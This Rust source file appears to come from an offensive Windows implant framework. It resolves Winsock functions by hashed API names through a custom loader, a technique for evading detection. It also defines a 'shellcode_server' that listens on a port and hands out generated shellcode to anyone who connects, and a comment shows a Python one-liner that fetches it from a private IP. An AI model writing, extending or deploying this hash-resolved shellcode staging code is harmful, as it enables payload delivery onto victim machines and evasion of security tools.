use core::{
    ffi::c_void,
    mem::{transmute, zeroed},
    ptr::{null, null_mut},
};

use alloc::{ffi::CString, slice, vec::Vec};

use crate::libs::{ldrapi::ldr_function, ntdef::UnicodeString, utils::get_magic};
use crate::get_instance;

use super::utils::get_shellcode;

pub const FIONBIO: i32 = -2147195266i32;

#[allow(non_camel_case_types)]
pub type SOCKET = usize;

const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const IPPROTO_TCP: i32 = 6;
const INVALID_SOCKET: usize = !0;
const SOCKET_ERROR: i32 = -1;

// Data structures for Winsock
#[repr(C)]
pub struct WsaData {
    pub w_version: u16,
    pub w_high_version: u16,
    pub sz_description: [i8; 257],
    pub sz_system_status: [i8; 129],
    pub i_max_sockets: u16,
    pub i_max_udp_dg: u16,
    pub lp_vendor_info: *mut i8,
}

#[repr(C)]
pub struct SockAddrIn {
    pub sin_family: u16,
    pub sin_port: u16,
    pub sin_addr: InAddr,
    pub sin_zero: [i8; 8],
}

#[repr(C)]
pub struct InAddr {
    pub s_addr: u32,
}

#[repr(C)]
pub struct SockAddr {
    pub sa_family: u16,
    pub sa_data: [i8; 14],
}

#[repr(C)]
pub struct AddrInfo {
    pub ai_flags: i32,
    pub ai_family: i32,
    pub ai_socktype: i32,
    pub ai_protocol: i32,
    pub ai_addrlen: usize, // size_t on 64-bit
    pub ai_canonname: *mut i8,
    pub ai_addr: *mut SockAddr,
    pub ai_next: *mut AddrInfo,
}

#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Clone, Copy)]
pub struct FD_SET {
    pub fd_count: u32,
    pub fd_array: [SOCKET; 64],
}

#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Clone, Copy)]
pub struct TIMEVAL {
    pub tv_sec: i32,
    pub tv_usec: i32,
}

#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Clone, Copy)]
pub struct WSAPOLLFD {
    pub fd: SOCKET,
    pub events: i16,
    pub revents: i16,
}

// WSAPoll event flags
pub const POLLRDNORM: i16 = 0x0100;
pub const POLLRDBAND: i16 = 0x0200;
pub const POLLIN: i16 = POLLRDNORM | POLLRDBAND;
pub const POLLPRI: i16 = 0x0400;
pub const POLLWRNORM: i16 = 0x0010;
pub const POLLOUT: i16 = POLLWRNORM;
pub const POLLWRBAND: i16 = 0x0020;
pub const POLLERR: i16 = 0x0001;
pub const POLLHUP: i16 = 0x0002;
pub const POLLNVAL: i16 = 0x0004;

// Define function types for Winsock functions
type WSAStartupFunc =
    unsafe extern "system" fn(wVersionRequested: u16, lpWsaData: *mut WsaData) -> i32;
type WSACleanupFunc = unsafe extern "system" fn() -> i32;
type SocketFunc = unsafe extern "system" fn(af: i32, socket_type: i32, protocol: i32) -> SOCKET;
type ConnectFunc = unsafe extern "system" fn(s: SOCKET, name: *const SockAddr, namelen: i32) -> i32;
type SendFunc = unsafe extern "system" fn(s: SOCKET, buf: *const i8, len: i32, flags: i32) -> i32;
type RecvFunc = unsafe extern "system" fn(s: SOCKET, buf: *mut i8, len: i32, flags: i32) -> i32;
type ClosesocketFunc = unsafe extern "system" fn(s: SOCKET) -> i32;
type ShutdownFunc = unsafe extern "system" fn(s: SOCKET, how: i32) -> i32;
type InetAddrFunc = unsafe extern "system" fn(cp: *const i8) -> u32;
type HtonsFunc = unsafe extern "system" fn(hostshort: u16) -> u16;
type GetAddrInfoFunc = unsafe extern "system" fn(
    node: *const i8,
    service: *const i8,
    hints: *const AddrInfo,
    res: *mut *mut AddrInfo,
) -> i32;
type FreeAddrInfoFunc = unsafe extern "system" fn(res: *mut AddrInfo);

type Ioctlsocket = unsafe extern "system" fn(s: SOCKET, cmd: i32, argp: *mut u32) -> i32;

type Select = unsafe extern "system" fn(
    nfds: i32,
    readfds: *mut FD_SET,
    writefds: *mut FD_SET,
    exceptfds: *mut FD_SET,
    timeout: *mut TIMEVAL,
) -> i32;

type WSAGetLastError = unsafe extern "system" fn() -> i32;
type BindFunc = unsafe extern "system" fn(s: SOCKET, name: *const SockAddr, namelen: i32) -> i32;
type ListenFunc = unsafe extern "system" fn(s: SOCKET, backlog: i32) -> i32;
type AcceptFunc =
    unsafe extern "system" fn(s: SOCKET, addr: *mut c_void, addrlen: *mut i32) -> SOCKET;
type WSAAddressToStringAFunc = unsafe extern "system" fn(
    lpsaAddress: *const SockAddr,
    dwAddressLength: u32,
    lpProtocolInfo: *const c_void,
    lpszAddressString: *mut i8,
    lpdwAddressStringLength: *mut u32,
) -> i32;
type WSAPollFunc =
    unsafe extern "system" fn(fdArray: *mut WSAPOLLFD, fds: u32, timeout: i32) -> i32;

pub struct Winsock {
    pub wsa_startup: WSAStartupFunc,
    pub wsa_cleanup: WSACleanupFunc,
    pub socket: SocketFunc,
    pub connect: ConnectFunc,
    pub send: SendFunc,
    pub recv: RecvFunc,
    pub closesocket: ClosesocketFunc,
    pub shutdown: ShutdownFunc,
    pub inet_addr: InetAddrFunc,
    pub htons: HtonsFunc,
    pub getaddrinfo: GetAddrInfoFunc,
    pub freeaddrinfo: FreeAddrInfoFunc,
    pub ioctlsocket: Ioctlsocket,
    pub select: Select,
    pub wsa_get_last_error: WSAGetLastError,
    pub bind: BindFunc,
    pub listen: ListenFunc,
    pub accept: AcceptFunc,
    pub wsa_address_to_string_a: WSAAddressToStringAFunc,
    pub wsa_poll: WSAPollFunc,
}

impl Winsock {
    pub fn new() -> Self {
        Winsock {
            wsa_startup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_cleanup: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            socket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            connect: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            send: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            recv: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            closesocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            shutdown: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            inet_addr: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            htons: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            getaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            freeaddrinfo: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            ioctlsocket: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            select: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_get_last_error: unsafe {
                core::mem::transmute(core::ptr::null::<core::ffi::c_void>())
            },
            bind: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            listen: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            accept: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
            wsa_address_to_string_a: unsafe {
                core::mem::transmute(core::ptr::null::<core::ffi::c_void>())
            },
            wsa_poll: unsafe { core::mem::transmute(core::ptr::null::<core::ffi::c_void>()) },
        }
    }
}

pub fn init_winsock_funcs() {
    unsafe {
        pub const WSA_STARTUP_DBJ2: usize = 0x142e89c3;
        pub const WSA_CLEANUP_DBJ2: usize = 0x32206eb8;
        pub const SOCKET_DBJ2: usize = 0xcf36c66e;
        pub const CONNECT_DBJ2: usize = 0xe73478ef;
        pub const SEND_DBJ2: usize = 0x7c8bc2cf;
        pub const RECV_DBJ2: usize = 0x7c8b3515;
        pub const CLOSESOCKET_DBJ2: usize = 0x185953a4;
        pub const SHUTDOWN_DBJ2: usize = 0x87c99261;
        pub const INET_ADDR_DBJ2: usize = 0xafe73c2f;
        pub const HTONS_DBJ2: usize = 0xd454eb1;
        pub const GETADDRINFO_DBJ2: usize = 0x4b91706c;
        pub const FREEADDRINFO_DBJ2: usize = 0x307204e;
        pub const IOCTLSOCKET_H: usize = 0xd5e978a9;
        pub const SELECT_H: usize = 0xce86a705;
        pub const WSAGETLASTERROR_H: usize = 0x9c1d912e;
        pub const WSAADDRESSTOSTRINGA_H: usize = 0x8842fb1;
        pub const WSAPOLL_H: usize = 0xf32be067;

        let mut ws2_win32_dll_unicode = UnicodeString::new();
        let utf16_string: Vec<u16> = "ws2_32.dll".encode_utf16().chain(Some(0)).collect();
        ws2_win32_dll_unicode.init(utf16_string.as_ptr());

        let mut ws2_win32_handle: *mut c_void = null_mut();

        if let Some(instance) = get_instance() {
            (instance.ntdll.ldr_load_dll)(
                null_mut(),
                null_mut(),
                ws2_win32_dll_unicode,
                &mut ws2_win32_handle as *mut _ as *mut c_void,
            );

            if ws2_win32_handle.is_null() {
                return;
            }

            let ws2_32_module = ws2_win32_handle as *mut u8;

            let wsa_startup_addr = ldr_function(ws2_32_module, WSA_STARTUP_DBJ2);
            let wsa_cleanup_addr = ldr_function(ws2_32_module, WSA_CLEANUP_DBJ2);
            let socket_addr = ldr_function(ws2_32_module, SOCKET_DBJ2);
            let connect_addr = ldr_function(ws2_32_module, CONNECT_DBJ2);
            let send_addr = ldr_function(ws2_32_module, SEND_DBJ2);
            let recv_addr = ldr_function(ws2_32_module, RECV_DBJ2);
            let closesocket_addr = ldr_function(ws2_32_module, CLOSESOCKET_DBJ2);
            let shutdown_addr = ldr_function(ws2_32_module, SHUTDOWN_DBJ2);
            let inet_addr_addr = ldr_function(ws2_32_module, INET_ADDR_DBJ2);
            let htons_addr = ldr_function(ws2_32_module, HTONS_DBJ2);
            let getaddrinfo_addr = ldr_function(ws2_32_module, GETADDRINFO_DBJ2);
            let freeaddrinfo_addr = ldr_function(ws2_32_module, FREEADDRINFO_DBJ2);
            let ioctlsocket_addr = ldr_function(ws2_32_module, IOCTLSOCKET_H);
            let select_addr = ldr_function(ws2_32_module, SELECT_H);
            let wsa_get_last_error_addr = ldr_function(ws2_32_module, WSAGETLASTERROR_H);
            let bind_addr = ldr_function(ws2_32_module, 0x7c828162);
            let listen_addr = ldr_function(ws2_32_module, 0xbe7f0354);
            let accept_addr = ldr_function(ws2_32_module, 0xa460acf5);
            let wsa_address_to_string_a_addr = ldr_function(ws2_32_module, WSAADDRESSTOSTRINGA_H);
            let wsa_poll_addr = ldr_function(ws2_32_module, WSAPOLL_H);

            instance.winsock.wsa_startup = transmute(wsa_startup_addr);
            instance.winsock.wsa_cleanup = transmute(wsa_cleanup_addr);
            instance.winsock.socket = transmute(socket_addr);
            instance.winsock.connect = transmute(connect_addr);
            instance.winsock.send = transmute(send_addr);
            instance.winsock.recv = transmute(recv_addr);
            instance.winsock.closesocket = transmute(closesocket_addr);
            instance.winsock.shutdown = transmute(shutdown_addr);
            instance.winsock.inet_addr = transmute(inet_addr_addr);
            instance.winsock.htons = transmute(htons_addr);
            instance.winsock.getaddrinfo = transmute(getaddrinfo_addr);
            instance.winsock.freeaddrinfo = transmute(freeaddrinfo_addr);
            instance.winsock.ioctlsocket = transmute(ioctlsocket_addr);
            instance.winsock.select = transmute(select_addr);
            instance.winsock.wsa_get_last_error = transmute(wsa_get_last_error_addr);
            instance.winsock.bind = transmute(bind_addr);
            instance.winsock.listen = transmute(listen_addr);
            instance.winsock.accept = transmute(accept_addr);
            instance.winsock.wsa_address_to_string_a = transmute(wsa_address_to_string_a_addr);
            instance.winsock.wsa_poll = transmute(wsa_poll_addr);
        }
    }
}

/// Initializes the Winsock library for network operations on Windows.
/// Returns 0 on success, or the error code on failure.
pub fn init_winsock() -> i32 {
    unsafe {
        let mut wsa_data: WsaData = core::mem::zeroed();
        let result = (get_instance().unwrap().winsock.wsa_startup)(0x0202, &mut wsa_data);
        if result != 0 {
            return (get_instance().unwrap().winsock.wsa_get_last_error)();
        }
        result
    }
}

/// Creates a new TCP socket for network communication.
/// Returns the socket descriptor (SOCKET) or an error code on failure.
pub fn create_socket() -> SOCKET {
    unsafe {
        (get_instance().unwrap().winsock.socket)(2, 1, 6) // AF_INET, SOCK_STREAM, IPPROTO_TCP
    }
}

#[cfg(feature = "payload_gen")]
pub unsafe extern "system" fn shellcode_server_thread(arg: *mut c_void) -> u32 {
    let port = arg as u16;
    shellcode_server(port, None);
    0
}

// to test: python3 -c "import socket;s=socket.socket();s.connect(('192.168.1.158',8080));s.send(b'\x05');s.settimeout(0.5);d=b'';exec('while 1:\n try:\n  c=s.recv(4096)\n  if not c:break\n  d+=c\n except:break');print(repr(d))"
#[cfg(feature = "payload_gen")]
pub fn shellcode_server(port: u16, magic_base: Option<u32>) -> Result<(), u32> {
    unsafe {
        init_winsock();
        let socket = create_socket();
        let mut addr: SockAddrIn = SockAddrIn {
            sin_family: AF_INET as u16,
            sin_port: port.to_be(),
            sin_addr: InAddr { s_addr: 0 }, // INADDR_ANY
            sin_zero: [0; 8],
        };
        if (get_instance().unwrap().winsock.bind)(
            socket,
            &mut addr as *mut SockAddrIn as *const SockAddr,
            size_of::<SockAddrIn>() as i32,
        ) == SOCKET_ERROR
        {
            return Err((get_instance().unwrap().winsock.wsa_get_last_error)() as u32);
        }
        if (get_instance().unwrap().winsock.listen)(socket, 5) == SOCKET_ERROR {
            return Err((get_instance().unwrap().winsock.wsa_get_last_error)() as u32);
        }

        // Magic counter that increments on each request
        let mut magic_counter: u32 = magic_base.unwrap_or(0);

        loop {

            let mut client_addr: SockAddrIn = core::mem::zeroed();
            let mut client_addr_len = core::mem::size_of::<SockAddrIn>() as i32;

            // Accept a connection
            let client_socket = (get_instance().unwrap().winsock.accept)(
                socket,
                //null_mut(),
                //null_mut(),
                &mut client_addr as *mut _ as *mut c_void,
                &mut client_addr_len,
            );

            if client_socket == INVALID_SOCKET {
                return Err((get_instance().unwrap().winsock.wsa_get_last_error)() as u32);
            }

            // Receive data
            let mut buffer: [u8; 1024] = [0; 1024];
            let bytes_received = (get_instance().unwrap().winsock.recv)(
                client_socket,
                buffer.as_mut_ptr() as *mut i8,
                buffer.len() as i32,
                0,
            );

            if bytes_received > 0 {
                let data = slice::from_raw_parts(buffer.as_ptr(), bytes_received as usize);

                // Get magic value for this request (only if magic_base was provided)
                let magic_opt = if magic_base.is_some() {
                    let m = magic_counter;
                    magic_counter = magic_counter.wrapping_add(1);
                    Some(m)
                } else {
                    Some(get_magic())
                };

                let shellcode = get_shellcode(Some(data[0]), magic_opt);

                // Send all data (loop in case send() doesn't send everything at once)
                let mut total_sent = 0;
                while total_sent < shellcode.len() {
                    let sent = (get_instance().unwrap().winsock.send)(
                        client_socket,
                        shellcode.as_ptr().add(total_sent) as *const i8,
                        (shellcode.len() - total_sent) as i32,
                        0,
                    );
                    if sent <= 0 {
                        break;
                    }
                    total_sent += sent as usize;
                }
            }
            // Graceful shutdown (SD_SEND = 1) then close
            (get_instance().unwrap().winsock.shutdown)(client_socket, 1);
            // Small delay to let FIN transmit before close
            (get_instance().unwrap().k32.sleep)(100);
            (get_instance().unwrap().winsock.closesocket)(client_socket);
        }

        // Cleanup
        (get_instance().unwrap().winsock.closesocket)(socket);
        (get_instance().unwrap().winsock.wsa_cleanup)();
    }
    Ok(())
}

/// Resolves a hostname to an IPv4 address string.
/// Returns the IPv4 address as a string (e.g., "142.250.80.46") or empty vec on failure.
pub fn resolve_hostname(hostname: &str) -> Vec<u8> {
    unsafe {
        init_winsock();
        let hostname_cstr = CString::new(hostname).unwrap();
        let mut hints: AddrInfo = zeroed();
        hints.ai_family = 2; // AF_INET
        hints.ai_socktype = 1; // SOCK_STREAM
        let mut res: *mut AddrInfo = null_mut();

        let status = (get_instance().unwrap().winsock.getaddrinfo)(
            hostname_cstr.as_ptr(),
            null(),
            &hints,
            &mut res,
        );

        if status != 0 || res.is_null() {
            return Vec::new();
        }

        let mut result: Vec<u8> = Vec::new();
        let mut addr_info_ptr = res;

        while !addr_info_ptr.is_null() {
            let addr_info = &*addr_info_ptr;
            if addr_info.ai_family == 2 {
                // AF_INET - use WSAAddressToStringA to convert
                let mut buf: [i8; 64] = [0; 64];
                let mut buf_len: u32 = 64;

                let ret = (get_instance().unwrap().winsock.wsa_address_to_string_a)(
                    addr_info.ai_addr,
                    addr_info.ai_addrlen as u32,
                    null(),
                    buf.as_mut_ptr(),
                    &mut buf_len,
                );

                if ret == 0 && buf_len > 0 {
                    // Copy result (exclude null terminator)
                    for i in 0..(buf_len - 1) as usize {
                        if buf[i] == 0 {
                            break;
                        }
                        result.push(buf[i] as u8);
                    }
                }
                break;
            }
            addr_info_ptr = addr_info.ai_next;
        }

        (get_instance().unwrap().winsock.freeaddrinfo)(res);
        result
    }
}

/// Connects a socket to a given address and port.
/// Returns 0 on success, or the error code on failure.
pub fn connect_socket(sock: SOCKET, addr: &str, port: u16) -> i32 {
    unsafe {
        let addr = if addr == "localhost" {
            "127.0.0.1"
        } else {
            addr
        };

        // Resolve hostname to IP string, then parse with inet_addr
        let resolved = resolve_hostname(addr);
        let ip_cstr = if resolved.is_empty() {
            // Try as literal IP address
            CString::new(addr).unwrap()
        } else {
            CString::new(resolved).unwrap()
        };
        let resolve_addr = (get_instance().unwrap().winsock.inet_addr)(ip_cstr.as_ptr());

        let mut sockaddr_in: SockAddrIn = core::mem::zeroed();
        sockaddr_in.sin_family = 2; // AF_INET
        sockaddr_in.sin_port = (get_instance().unwrap().winsock.htons)(port);
        sockaddr_in.sin_addr.s_addr = resolve_addr;

        let sockaddr = &sockaddr_in as *const _ as *const SockAddr;
        let result = (get_instance().unwrap().winsock.connect)(
            sock,
            sockaddr,
            core::mem::size_of::<SockAddrIn>() as i32,
        );

        if result != 0 {
            return (get_instance().unwrap().winsock.wsa_get_last_error)();
        }
        result
    }
}

pub fn test_port(target_host: &str, target_port: u16) -> Result<bool, u32> {
    init_winsock(); // Initialize Winsock library for network communication
    let sock = create_socket(); // Create a TCP socket

    // Check if the socket creation was successful
    if sock == !0 {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    // Attempt to connect the socket to the provided URL and lport
    let connect_result = connect_socket(sock, target_host, target_port);

    unsafe {
        (get_instance().unwrap().winsock.closesocket)(sock);
        (get_instance().unwrap().winsock.wsa_cleanup)();
    }

    if connect_result != 0 {
        return Ok(false);
    }

    Ok(true)
}
